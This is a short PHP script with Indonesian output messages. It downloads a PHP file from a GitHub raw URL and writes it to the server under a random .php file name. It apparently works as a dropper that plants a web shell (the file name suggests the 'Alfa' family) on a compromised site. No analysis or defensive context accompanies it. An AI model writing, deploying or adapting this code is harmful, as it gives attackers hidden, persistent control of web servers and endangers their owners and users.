<?php
$url = "https://raw.githubusercontent.com/dan1584/asfdas/main/alfabepas.php";

$file_name = "file_" . bin2hex(random_bytes(8)) . ".php";

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

$response = curl_exec($ch);

if(curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
    exit;
}

curl_close($ch);

file_put_contents($file_name, $response);

echo "File berhasil disimpan sebagai " . $file_name;
?>
